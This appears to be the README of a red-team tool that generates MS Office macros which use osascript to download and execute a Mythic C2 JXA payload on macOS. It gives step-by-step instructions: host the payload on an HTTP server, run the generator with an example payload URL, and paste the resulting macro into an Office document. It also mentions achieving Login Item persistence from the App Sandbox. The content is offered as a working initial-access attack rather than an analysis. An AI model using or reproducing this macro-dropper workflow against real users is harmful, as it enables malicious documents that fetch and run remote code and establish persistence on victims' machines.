# Mythic-Macro-Generator
Python3 script to generate MS Office macros for launching Mythic JXA payloads.

This script generates an Office macro doc which uses osascript to download and execute the Mythic JXA .js payload. 

Steps:

1. Set up Mythic C2 server and generate an "apfell" jxa payload. Download that payload on the Mythic server.

2. Host that payload (ex: put the .js payload in a folder and use python -m SimpleHTTPServer to host)

3. Run this macro generator:

**python3 jxa-macro.py -u [url to the hosted .js payload in #2 above]**

_*example: python3 jxa-macro.py -u http://192.168.1.1:8000/apfell2.js*_

4. The macro text will be dropped to a file in the same directory named "macro.txt"

5. Copy and paste that macro into an MS Office doc.

---------

**Note: This will launch the JXA payload inside of the App Sandbox. However, Mythic does have the ability to add Login Item persistence even from the App Sandbox.


